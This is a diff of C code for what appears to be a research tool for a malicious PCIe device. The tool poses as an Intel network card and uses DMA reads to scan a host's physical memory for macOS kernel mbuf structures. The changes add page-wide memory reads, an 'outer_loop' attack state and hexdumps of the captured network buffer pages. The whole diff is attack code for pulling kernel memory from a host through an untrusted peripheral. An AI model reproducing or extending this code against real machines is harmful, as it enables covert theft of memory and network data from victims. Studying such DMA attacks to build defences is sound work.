@@ -37,7 +37,9 @@
 #include <stdio.h>
 
 #include "mask.h"
+#include "macos-mbuf-manipulation.h"
 #include "macos-stub-mbuf.h"
+#include "hexdump.h"
 #include "pcie.h"
 #include "pcie-backend.h"
 #include "qemu/bswap.h"
@@ -149,25 +151,6 @@ endianess_swap_descriptors(struct bcm5701_send_buffer_descriptor *descriptor,
 	}
 }
 
-void
-endianness_swap_mbuf_header(struct mbuf *mbuf)
-{
-	mbuf->m_next = bswap64(mbuf->m_next);
-	mbuf->m_nextpkt = bswap64(mbuf->m_nextpkt);
-	mbuf->m_data = bswap64(mbuf->m_data);
-	mbuf->m_len = bswap32(mbuf->m_len);
-	mbuf->m_type = bswap16(mbuf->m_type);
-	mbuf->m_flags = bswap16(mbuf->m_flags);
-}
-
-void
-print_mbuf_header(const struct mbuf *mbuf)
-{
-	printf("m_next: 0x%016lx. mh_nextpkt 0x%016lx.\n",
-		mbuf->m_next, mbuf->m_nextpkt);
-	printf("m_data: 0x%016lx. m_len: %d.\n", mbuf->m_data, mbuf->m_len);
-	printf("m_type: %x. m_flags: %x.\n", mbuf->m_type, mbuf->m_flags);
-}
 
 bool
 is_probably_mbuf(const struct mbuf *mbuf)
@@ -177,6 +160,11 @@ is_probably_mbuf(const struct mbuf *mbuf)
 	 * memory, we can't afford to detect empties as mbufs.
 	 */
 	return ((mbuf->m_next & 0xFF) == 0) &&
+		/*
+		((mbuf->m_next & 0xffffff0000000000ll) == 0xffffff0000000000ll) &&
+		((mbuf->m_nextpkt & 0xffffff0000000000ll) == 0xffffff0000000000ll) &&
+		((mbuf->m_data & 0xffffff0000000000ll) == 0xffffff0000000000ll) &&
+		*/
 		((mbuf->m_nextpkt & 0xFF) == 0) &&
 		(mbuf->m_type <= MT_MAX) &&
 		(mbuf->m_len >= 0) && (mbuf->m_len <= 16384) &&
@@ -211,34 +199,6 @@ read_page(uint64_t address, uint32_t devfn, uint8_t* buffer)
 		}
 	}
 	return read_result;
-}
-
-void
-hexdump(uint8_t* data, uint64_t length)
-{
-	const uint64_t BYTES_PER_LINE = 16;
-	uint64_t char_offset, offset = 0;
-	while (offset < length) {
-		if (offset % BYTES_PER_LINE == 0) {
-			printf("%04lx  ", offset);
-		}
-		printf("%02x", data[offset]);
-		++offset;
-		if ((offset % BYTES_PER_LINE == 0) || offset >= length) {
-			putchar(' ');
-			for (char_offset = offset - BYTES_PER_LINE; char_offset < offset;
-				++char_offset) {
-				if (data[char_offset] >= 0x20 && data[char_offset] <= 126) {
-					putchar(data[char_offset]);
-				} else {
-					putchar(' ');
-				}
-			}
-			putchar('\n');
-		} else {
-			putchar(' ');
-		}
-	}
 }
 
 int
@@ -280,6 +240,7 @@ enum packet_response {
 
 struct packet_response_state {
 	uint32_t devfn;
+	enum attack_state outer_loop;
 	enum attack_state attack_state;
 };
 
@@ -318,7 +279,7 @@ respond_to_packet(struct packet_response_state *state,
 			case 0: /* vendor and device id */
 				out->data[0] = 0x104b8086;
 				if (state->attack_state == AS_UNINITIALISED) {
-					state->attack_state = AS_LINEAR_SCAN_FOR_MBUF;
+					state->attack_state = state->outer_loop;
 				}
 				break;
 			default:
@@ -351,10 +312,12 @@ respond_to_packet(struct packet_response_state *state,
 	return response;
 }
 
+#define MBUFS_PER_PAGE	(4096 / sizeof(struct mbuf))
+
 int
 main(int argc, char *argv[])
 {
-	bool ring_plausible;
+	bool all_mbufs, ring_plausible;
 	int i, send_result, read_result;
 	TLPQuadWord tlp_in_quadword[32];
 	TLPQuadWord tlp_out_header[2];
@@ -366,6 +329,7 @@ main(int argc, char *argv[])
 
 	enum packet_response response;
 	struct packet_response_state packet_response_state;
+	packet_response_state.outer_loop = AS_LINEAR_SCAN_FOR_MBUF;
 	packet_response_state.attack_state = AS_UNINITIALISED;
 	uint64_t read_addr, next_read_addr = 0x400000;
 	/*uint64_t read_addr, next_read_addr = 0x800000;*/
@@ -378,10 +342,11 @@ main(int argc, char *argv[])
 	uint64_t candidate_symbols[32];
 	uint8_t read_buffer[512];
 	struct mbuf mbuf;
+	struct mbuf mbuf_page[MBUFS_PER_PAGE];
 
 	uint16_t length;
-	uint64_t descriptor_index, host_address, mbuf_page_address, mbuf_index;
-	uint64_t mbuf_address, mbuf_data_address, m_next_value;
+	uint64_t descriptor_index, host_address, last_page_address;
+	uint64_t mbuf_index, mbuf_data_address, m_next_value, mbuf_page_address;
 	uint8_t *mbuf_data;
 
 	int init = pcie_hardware_init(argc, argv, &physmem);
@@ -536,47 +501,51 @@ main(int argc, char *argv[])
 		case AS_LINEAR_SCAN_FOR_MBUF:
 			read_result = perform_dma_read((uint8_t *)(&mbuf), sizeof(mbuf),
 				packet_response_state.devfn, 0, next_read_addr);
-			endianness_swap_mbuf_header(&mbuf);
+			endianness_swap_mac_mbuf_header(&mbuf);
 			if (is_probably_mbuf(&mbuf)) {
-				printf("Found probably a mbuf at 0x%lx.\n", next_read_addr);
-				print_mbuf_header(&mbuf);
-				hexdump((uint8_t *)&mbuf, 256);
+				last_page_address = mbuf_page_address;
+				mbuf_page_address = next_read_addr & ~uint64_mask(12);
+				if (last_page_address != mbuf_page_address) {
+					packet_response_state.attack_state = AS_READING_MBUF_PAGE;
+				}
 			}
 			next_read_addr += 4096;
 			break;
 		case AS_READING_MBUF_PAGE:
-			mbuf_address = mbuf_page_address + (mbuf_index * sizeof(struct mbuf));
-			read_result = perform_dma_read((uint8_t *)(&mbuf), sizeof(mbuf),
-				packet_response_state.devfn, 0, mbuf_address);
+			read_result = 0;
+			for (i = 0; i < 4096; i += 512) {
+				read_result += perform_dma_read((uint8_t *)(mbuf_page) + i,
+					512, packet_response_state.devfn, 0,
+					mbuf_page_address + i);
+			}
 			if (read_result == -1) {
-				printf("Failed to read mbuf at 0x%lx.\n", mbuf_address);
+				printf("Failed to read mbuf page at 0x%lx.\n",
+					mbuf_page_address);
+				continue;
 			} else {
-				printf("mbuf candidate at 0x%lx. %s\n", mbuf_address,
-					is_probably_mbuf(&mbuf) ? "probably mbuf" :
-					"probably not mbuf");
-				endianness_swap_mbuf_header(&mbuf);
-				print_mbuf_header(&mbuf);
+				all_mbufs = true;
 #if 0
-				print_mbuf_header(&mbuf);
-				/*hexdump((uint8_t *)&mbuf, 256);*/
-				if (!(mbuf.m_flags & M_EXT)) {
-					/* We don't have the address for external data. Hopefully
-					 * we found it elsewhere.
-					 */
-					/*if (mbuf.m_len > 0 && mbuf.m_len < 224) { [> Probably not an mbuf. <]*/
-					if (is_probably_mbuf(&mbuf)) { /* Probably not an mbuf. */
-						printf("Found probably a mbuf at 0x%lx.\n", next_read_addr);
-						/*print_mbuf_header(&mbuf);*/
-						/*hexdump((uint8_t *)&mbuf, 256);*/
+				for (mbuf_index = 0; mbuf_index < MBUFS_PER_PAGE; ++mbuf_index) {
+					if (!is_probably_mbuf(mbuf_page + mbuf_index)) {
+						all_mbufs = false;
+						break;
 					}
 				}
 #endif
+				if (all_mbufs) {
+					printf("Found mbuf page at: 0x%lx.\n", mbuf_page_address);
+					for (mbuf_index = 0; mbuf_index < MBUFS_PER_PAGE;
+						++mbuf_index) {
+						endianness_swap_mac_mbuf_header(mbuf_page + mbuf_index);
+						if (is_probably_mbuf(mbuf_page + mbuf_index)) {
+							print_macos_mbuf_header(mbuf_page + mbuf_index);
+						}
+					}
+				}
+				hexdump(mbuf_page, 4096);
 			}
-			++mbuf_index;
-			if (mbuf_index >= (4096 / 256)) {
-				packet_response_state.attack_state = (descriptor_index >= 16) ?
-					AS_LOOKING_FOR_DESCRIPTOR_RING : AS_FINDING_MBUF;
-			}
+			packet_response_state.attack_state =
+				packet_response_state.outer_loop;
 			break;
 		}
 	}
